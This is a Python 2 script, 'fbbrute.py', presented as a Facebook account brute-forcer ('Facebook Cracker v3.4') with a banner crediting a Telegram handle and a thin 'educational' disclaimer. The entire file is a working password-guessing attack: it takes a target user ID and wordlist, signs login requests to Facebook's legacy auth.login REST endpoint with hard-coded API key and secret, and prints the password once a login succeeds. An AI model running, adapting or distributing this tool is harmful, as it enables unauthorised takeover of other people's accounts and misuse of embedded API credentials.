## fbbrute.py - Facebook Brute Force
# -*- coding: utf-8 -*-
##
import os
import sys
import urllib
import hashlib

API_SECRET = "62f8ce9f74b12f84c123cc23437a4a32"

__banner__ = """
       +=======================================+
       |..........Facebook Cracker v3.4.........|
       +---------------------------------------+
       |#Creator: £ BLUE_DEVIL £ ™ ™                  |
       |#Contact: Telegram @AKASH_AM11    |
       |#Date: Fri 27/03/2020                                  |
       |#This tool is made for educational          |
       |#Changing the codes  of this tool.           |
       |Won't made you the official coder ^_^ !!!|
       |#Respect Coderz ^_^ ...PLZ🙏            |
       |#I take no responsibilities for the    |
       |  use of this program !                |
       +=======================================+
       |..........Facebook Cracker v3.4..........|
       +---------------------------------------+
        |#JOIN TELEGRAM: @WWMethLabs      |
"""

print("[+] Facebook Brute Forcer #BLUE@DEVIL\n")
userid = raw_input("[**] Enter |Username|[ID]:@ ")
try:
  passlist = raw_input("[**] Set PATH to passlist[ENTER blue.txt]: ")
  if os.path.exists(passlist) != False:
    print(__banner__)
    print("HELLO USER 👤 , THIS IS THE OFFICIAL BLUE_DEVIL SERVER")
    print(" [+] Account to crack : {}".format(userid))
    print(" [+] Loaded : {}".format(len(open(passlist,"r").read().split("\n"))))
    print(" [+] Cracking, please wait #BLUE@DEVIL ...")
    for passwd in open(passlist,'r').readlines():
      sys.stdout.write(u"\u001b[1000D[*] Trying {}".format(passwd.strip()))
      sys.stdout.flush()
      sig = "api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail={}format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword={}return_ssl_resources=0v=1.0{}".format(userid,passwd.strip(),API_SECRET)
      xx = hashlib.md5(sig).hexdigest()
      data = "api_key=882a8490361da98702bf97a021ddc14d&credentials_type=password&email={}&format=JSON&generate_machine_id=1&generate_session_cookies=1&locale=en_US&method=auth.login&password={}&return_ssl_resources=0&v=1.0&sig={}".format(userid,passwd.strip(),xx)
      response = urllib.urlopen("https://api.facebook.com/restserver.php?{}".format(data)).read()
      if "error" in response:
        pass
      else:
        print("\n\n[+] Password found ..ENJOY🆔!!")
        print("\n[+] Password : {}".format(passwd.strip()))
        break
    print("\n\n[!] Done .. !!")
  else:
    print("BLUE.FOUND: error: No such file or directory")
except KeyboardInterrupt:
  print("fbbrute: error: Keyboard interrupt")
